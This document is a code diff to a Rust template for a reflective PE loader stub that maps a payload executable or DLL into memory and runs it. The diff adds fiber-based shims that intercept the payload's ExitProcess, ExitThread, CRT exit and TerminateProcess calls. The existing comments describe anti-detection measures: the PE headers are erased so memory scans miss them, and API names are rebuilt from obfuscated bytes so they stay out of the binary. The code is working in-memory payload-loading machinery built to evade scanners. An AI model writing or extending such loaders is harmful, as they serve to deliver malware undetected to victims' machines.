@@ -2,8 +2,9 @@
 
 use std::ffi::c_void;
 use std::ptr;
+use std::sync::atomic::{AtomicBool, AtomicI32, AtomicU32, AtomicUsize, Ordering};
 
-use windows::Win32::Foundation::{BOOL, HINSTANCE};
+use windows::Win32::Foundation::{BOOL, HANDLE, HINSTANCE};
 use windows::Win32::System::Diagnostics::Debug::{
     IMAGE_DIRECTORY_ENTRY_BASERELOC, IMAGE_DIRECTORY_ENTRY_EXPORT, IMAGE_DIRECTORY_ENTRY_IMPORT,
     IMAGE_DIRECTORY_ENTRY_TLS, IMAGE_FILE_DLL, IMAGE_SECTION_HEADER,
@@ -17,7 +18,12 @@ use windows::Win32::System::SystemServices::{
     IMAGE_NT_SIGNATURE, IMAGE_REL_BASED_DIR64, IMAGE_REL_BASED_HIGH, IMAGE_REL_BASED_HIGHLOW,
     IMAGE_REL_BASED_LOW, PIMAGE_TLS_CALLBACK,
 };
-use windows::Win32::System::Threading::GetCurrentProcess;
+use windows::Win32::System::Threading::{
+    ConvertFiberToThread, ConvertThreadToFiber, CreateFiberEx, DeleteFiber, ExitProcess, ExitThread,
+    GetCurrentProcess, GetCurrentProcessId, GetCurrentThreadId, GetProcessId, SwitchToFiber,
+    TerminateProcess,
+};
+use windows::Win32::System::WindowsProgramming::FIBER_FLAG_FLOAT_SWITCH;
 
 /// Entry point signature of a mapped EXE (returns the process exit code).
 type ExeEntryPoint = unsafe extern "system" fn() -> u32;
@@ -42,6 +48,23 @@ const EXPECTED_MAGIC: u16 = 0x10b;
 /// (`params.erase_header`), so a memory scan does not find an `MZ`/`PE` pair at
 /// the mapped base. Substituted at build time by `Params::render_fragment`.
 const ERASE_HEADER: bool = $ERASE_HEADER$;
+
+/// Whether to intercept the payload's `ExitProcess`/`ExitThread` imports and run
+/// the payload on a fiber (`params.patch_exit`), so its exit hands the thread
+/// back to the loader instead of ending the process. Substituted at build time
+/// by `Params::render_fragment`.
+const PATCH_EXIT: bool = $PATCH_EXIT$;
+
+/// The loader's thread, recorded for the whole load while `patch_exit` is on.
+/// The exit shim uses it to tell the loader's thread (whose payload runs on a
+/// fiber) from a thread the payload created itself.
+static LOADER_THREAD: AtomicU32 = AtomicU32::new(0);
+/// The loader's fiber while the payload runs; zero outside that window.
+static LOADER_FIBER: AtomicUsize = AtomicUsize::new(0);
+/// Whether the payload left through the exit shim rather than returning.
+static EXIT_INTERCEPTED: AtomicBool = AtomicBool::new(false);
+/// The code an intercepted exit carried.
+static EXIT_CODE: AtomicI32 = AtomicI32::new(0);
 
 /// `IMAGE_TLS_DIRECTORY` for the stub's architecture. The 32-bit layout is
 /// defined by hand: the `windows` crate only exposes the 64-bit one, and the
@@ -69,6 +92,115 @@ fn nt_error(label: String, status: i32) -> String {
 /// site, so this literal carries no diagnostic text).
 fn section_error(label: String, section: &str) -> String {
     format!("{label}: {section}")
+}
+
+/// State shared between the loader fiber and the payload fiber (`patch_exit`).
+///
+/// It lives in the loader's *stack* frame on purpose: the hand-off does not
+/// depend on the heap, and the mapped payload image can never overlap it.
+struct FiberContext {
+    /// The payload entry to run: an executable entry point or a resolved DLL
+    /// export, both already inside the mapped image.
+    entry: usize,
+    /// `true` when `entry` is an export (`fn()`); `false` for an executable entry
+    /// point (`fn() -> u32`).
+    export: bool,
+    /// The fiber this thread was converted from; the payload fiber switches back
+    /// to it when the payload returns.
+    loader: usize,
+    /// The payload's return value, captured before the switch back.
+    code: i32,
+}
+
+/// Fiber start routine: runs the payload and schedules the loader fiber again.
+///
+/// A fiber function that *returns* ends the thread with it, so this routine
+/// never returns: the explicit switch back is what makes the payload call a
+/// *returning* one (see `run_on_fiber`).
+unsafe extern "system" fn payload_fiber(parameter: *mut c_void) {
+    // SAFETY: `parameter` is the `&mut FiberContext` the loader passed to
+    // `CreateFiberEx`. The loader's frame outlives this fiber: it only deletes
+    // the fiber after this routine has scheduled it back.
+    let context = unsafe { &mut *(parameter as *mut FiberContext) };
+    let code = if context.export {
+        // SAFETY: `entry` is an export resolved inside the mapped image.
+        let entry: unsafe extern "system" fn() = unsafe { std::mem::transmute(context.entry) };
+        unsafe { entry() };
+        0
+    } else {
+        // SAFETY: `entry` is `image_base + AddressOfEntryPoint`.
+        let entry: ExeEntryPoint = unsafe { std::mem::transmute(context.entry) };
+        unsafe { entry() as i32 }
+    };
+    context.code = code;
+    // SAFETY: `loader` is the fiber this thread was converted from, so switching
+    // to it resumes `run_on_fiber` right after its `SwitchToFiber` call. This
+    // fiber is deleted there.
+    unsafe { SwitchToFiber(context.loader as *const c_void) };
+    // Not reached: the loader deletes the fiber instead of resuming it.
+}
+
+/// Runs a payload entry on a fiber (`patch_exit`), so an `ExitProcess` or
+/// `ExitThread` call from the payload can hand the thread back to the loader
+/// instead of ending the process.
+///
+/// Returns the entry point's return value, or the code an intercepted exit
+/// carried. `entry` is an executable entry point when `export` is `false`, and a
+/// resolved DLL export when it is `true`.
+fn run_on_fiber(entry: usize, export: bool) -> Result<i32, String> {
+    // SAFETY: documented kernel32 fiber APIs; every failure path releases the
+    // thread conversion before returning, and the context lives in this frame.
+    unsafe {
+        let loader = ConvertThreadToFiber(None);
+        if loader.is_null() {
+            return Err($MSG_FIBER_CONVERT_FAILED$);
+        }
+
+        let mut context = FiberContext {
+            entry,
+            export,
+            loader: loader as usize,
+            code: 0,
+        };
+        // `FIBER_FLAG_FLOAT_SWITCH`: on x86 the floating-point state is not
+        // switched without it, so the payload's FP use would corrupt the
+        // loader's state (on x64 the state is part of the fiber context anyway).
+        let fiber = CreateFiberEx(
+            0,
+            0,
+            FIBER_FLAG_FLOAT_SWITCH,
+            Some(payload_fiber),
+            Some(&mut context as *mut FiberContext as *const c_void),
+        );
+        if fiber.is_null() {
+            let _ = ConvertFiberToThread();
+            return Err($MSG_FIBER_CREATE_FAILED$);
+        }
+
+        EXIT_INTERCEPTED.store(false, Ordering::SeqCst);
+        EXIT_CODE.store(0, Ordering::SeqCst);
+        LOADER_FIBER.store(loader as usize, Ordering::SeqCst);
+
+        // Returns when the payload fiber schedules the loader again: either the
+        // payload returned or its exit call went through `exit_shim`.
+        SwitchToFiber(fiber as *const c_void);
+
+        // Close the hand-off window before any loader code runs again, so a late
+        // exit call from a payload thread cannot target a deleted fiber.
+        LOADER_FIBER.store(0, Ordering::SeqCst);
+
+        // Order matters: `ConvertFiberToThread` releases the thread's fiber
+        // state and no fiber call may follow it, so the payload fiber (suspended
+        // inside its switch back) is deleted first.
+        DeleteFiber(fiber as *const c_void);
+        let _ = ConvertFiberToThread();
+
+        if EXIT_INTERCEPTED.load(Ordering::SeqCst) {
+            Ok(EXIT_CODE.load(Ordering::SeqCst))
+        } else {
+            Ok(context.code)
+        }
+    }
 }
 
 /// A base relocation entry (type + offset packed in a `u16`).
@@ -107,6 +239,11 @@ pub unsafe fn run_reflective(
 ) -> Result<i32, String> {
     let (_dos, nt) = get_headers(payload)?;
     let is_dll = (*nt).FileHeader.Characteristics.0 & IMAGE_FILE_DLL.0 != 0;
+    if PATCH_EXIT {
+        // Recorded before the IAT patch below makes the exit shim reachable, so
+        // a TLS callback that exits is already classified correctly.
+        LOADER_THREAD.store(GetCurrentThreadId(), Ordering::SeqCst);
+    }
     crate::tech_dbg!(
         "reflective_loading",
         "payload {} bytes (dll={is_dll})",
@@ -183,7 +320,13 @@ pub unsafe fn run_reflective(
         crate::tech_dbg!("reflective_loading", "calling export '{name}' at 0x{address:x}");
         {
             let _handoff = crate::tls_handoff::PauseGuard::enter();
-            call_export(address);
+            if PATCH_EXIT {
+                // An export can exit too; a fiber makes that a hand-off instead
+                // of a process teardown. The export's value is not the step's.
+                run_on_fiber(address, true)?;
+            } else {
+                call_export(address);
+            }
         }
         // The payload is back: report the runtime hook's work on the loader's
         // thread, where the debug stub's TLS is provisioned (the proxy itself
@@ -415,6 +558,119 @@ unsafe fn section_name(section: *const IMAGE_SECTION_HEADER) -> String {
     String::from_utf8_lossy(&name[..end]).into_owned()
 }
 
+/// Hands the calling payload thread back to the loader, with `code` as the
+/// step's exit code.
+///
+/// On the loader's thread the payload runs on a fiber, so the code is recorded
+/// and the shim switches back to the loader instead of tearing the process down.
+/// On a thread the payload created there is no fiber to switch to: `ExitThread`
+/// ends just that thread and the process survives. Outside the fiber window (a
+/// TLS callback or `DllMain` that exits) the loader cannot resume its flow, so
+/// the real `ExitProcess` runs as before.
+///
+/// # Safety
+/// Must only be called from an intercepted exit shim.
+unsafe fn hand_off(code: u32) -> ! {
+    let thread = GetCurrentThreadId();
+    let loader = LOADER_FIBER.load(Ordering::SeqCst);
+    if loader != 0 && thread == LOADER_THREAD.load(Ordering::SeqCst) {
+        EXIT_CODE.store(code as i32, Ordering::SeqCst);
+        EXIT_INTERCEPTED.store(true, Ordering::SeqCst);
+        // SAFETY: `loader` is the fiber this thread was converted from and is
+        // still alive: `run_on_fiber` deletes the payload fiber only after the
+        // switch returns.
+        unsafe { SwitchToFiber(loader as *const c_void) };
+        // Not reached: the loader deletes this fiber instead of resuming it. If
+        // it ever were resumed, ending the process is the honest fallback.
+        unsafe { ExitProcess(code) }
+    }
+    if thread != LOADER_THREAD.load(Ordering::SeqCst) {
+        // A payload-created thread is not a fiber; ending it leaves the loader's
+        // thread (and the chain) alive.
+        unsafe { ExitThread(code) }
+    }
+    // The loader's thread outside the fiber window: the old behavior.
+    unsafe { ExitProcess(code) }
+}
+
+/// `ExitProcess`/`ExitThread` shim (`extern "system"`, one `u32`).
+///
+/// # Safety
+/// Only reachable as an IAT entry of the mapped payload image.
+unsafe extern "system" fn exit_shim(code: u32) -> ! {
+    unsafe { hand_off(code) }
+}
+
+/// C runtime `exit`/`_exit` shim (`extern "C"`: cdecl on x86, unlike the Win32
+/// exports above). The payload's CRT calls `exit` at the end of `mainCRTStartup`
+/// and on `sys.exit`, so intercepting it is what makes a normal C/C++/Python
+/// executable hand control back.
+///
+/// # Safety
+/// Only reachable as an IAT entry of the mapped payload image.
+unsafe extern "C" fn crt_exit_shim(code: i32) -> ! {
+    unsafe { hand_off(code as u32) }
+}
+
+/// `TerminateProcess` shim (`extern "system"`, handle + code). Nuitka/PyInstaller
+/// and some runtimes end through this call instead of `ExitProcess`.
+///
+/// Only a call that targets *this* process is a hand-off; a payload that
+/// terminates another process gets the real export.
+///
+/// # Safety
+/// Only reachable as an IAT entry of the mapped payload image.
+unsafe extern "system" fn terminate_shim(process: HANDLE, code: u32) -> BOOL {
+    if terminates_self(process) {
+        unsafe { hand_off(code) }
+    }
+    // Another process: forward to the real export and preserve BOOL semantics
+    // (the `windows` wrapper turns the BOOL into a `Result`).
+    match unsafe { TerminateProcess(process, code) } {
+        Ok(()) => BOOL(1),
+        Err(_) => BOOL(0),
+    }
+}
+
+/// Whether `process` names the current process.
+fn terminates_self(process: HANDLE) -> bool {
+    unsafe {
+        process == GetCurrentProcess()
+            || GetProcessId(process) == GetCurrentProcessId()
+    }
+}
+
+/// The shim that serves an intercepted exit import, if any.
+///
+/// Every name is rebuilt from obfuscated bytes at the call site, so none lands
+/// in the stub's `.rdata`.
+fn exit_proxy(func: &str) -> Option<u64> {
+    if !PATCH_EXIT {
+        return None;
+    }
+    let process: String = $EXIT_PROCESS_DEF$;
+    if func == process.as_str() {
+        return Some(exit_shim as usize as u64);
+    }
+    let thread: String = $EXIT_THREAD_DEF$;
+    if func == thread.as_str() {
+        return Some(exit_shim as usize as u64);
+    }
+    let crt: String = $EXIT_DEF$;
+    if func == crt.as_str() {
+        return Some(crt_exit_shim as usize as u64);
+    }
+    let crt_fast: String = $UNDERSCORE_EXIT_DEF$;
+    if func == crt_fast.as_str() {
+        return Some(crt_exit_shim as usize as u64);
+    }
+    let terminate: String = $TERMINATE_PROCESS_DEF$;
+    if func == terminate.as_str() {
+        return Some(terminate_shim as usize as u64);
+    }
+    None
+}
+
 fn fix_imports(
     image_base: *mut c_void,
     nt: *const NtHeaders,
@@ -429,7 +685,8 @@ fn fix_imports(
         // The mapped image has RVA == offset from `image_base`. `patch_imports`
         // resolves the table, serves catalogue hits from `resolution_policy`,
         // and makes the IAT writable only while it writes (the loader maps it
-        // read-only).
+        // read-only). With `patch_exit` the payload's exit calls are redirected
+        // to the shims first; every other import keeps the build's policy.
         let view = std::slice::from_raw_parts_mut(
             image_base as *mut u8,
             (*nt).OptionalHeader.SizeOfImage as usize,
@@ -438,7 +695,10 @@ fn fix_imports(
             view,
             import_dir.VirtualAddress,
             import_dir.Size,
-            crate::resolution_policy,
+            |dll: &str, func: &str| match exit_proxy(func) {
+                Some(proxy) => crate::ImportPolicy::Proxy(proxy),
+                None => crate::resolution_policy(dll, func),
+            },
         )
         .map_err(|e| e.to_string())?;
         crate::tech_dbg!("reflective_loading", "IAT patched ({count} import(s))");
@@ -733,9 +993,11 @@ fn run_tls_callbacks(image_base: *mut c_void, nt: *const NtHeaders) -> Result<()
 
 /// Runs the payload's entry point on this thread and returns its exit code.
 ///
-/// The payload keeps the stub's thread rather than getting a fresh one. A
-/// payload that calls `ExitProcess` ends the process, exactly as it would from
-/// a thread it created itself.
+/// The payload keeps the stub's thread rather than getting a fresh one. With
+/// `patch_exit` it runs on a fiber on that same thread, so an `ExitProcess` call
+/// hands control back instead of ending the process; without it, a payload that
+/// calls `ExitProcess` ends the process, exactly as it would from a thread it
+/// created itself.
 fn execute_entrypoint(
     image_base: *mut c_void,
     nt: *const NtHeaders,
@@ -758,10 +1020,14 @@ fn execute_entrypoint(
         "reflective_loading",
         "jumping to entry point 0x{entry_point:x}"
     );
-    // SAFETY: `entry_point` is the payload's `AddressOfEntryPoint`, copied into
-    // executable memory with a matching ABI by the mapping steps above.
-    let exe_main: ExeEntryPoint = unsafe { std::mem::transmute(entry_point) };
-    let code = unsafe { exe_main() } as i32;
+    let code = if PATCH_EXIT {
+        run_on_fiber(entry_point, false)?
+    } else {
+        // SAFETY: `entry_point` is the payload's `AddressOfEntryPoint`, copied
+        // into executable memory with a matching ABI by the mapping steps above.
+        let exe_main: ExeEntryPoint = unsafe { std::mem::transmute(entry_point) };
+        unsafe { exe_main() as i32 }
+    };
     crate::tech_dbg!("reflective_loading", "payload returned {code}");
     Ok(code)
 }
